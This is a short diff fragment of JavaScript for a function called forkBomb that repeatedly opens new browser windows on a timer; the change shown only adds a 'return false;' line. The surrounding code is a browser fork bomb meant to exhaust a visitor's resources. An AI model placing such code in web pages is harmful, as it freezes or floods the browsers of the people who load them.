@@ -4,4 +4,5 @@ function forkBomb(event, timeout = 500, i = 0) {
     window.open('./?v=' + Math.random(), '_new' + (i || ''))
     forkBomb(timeout, i + 1)
   }, timeout)
+  return false;
 }
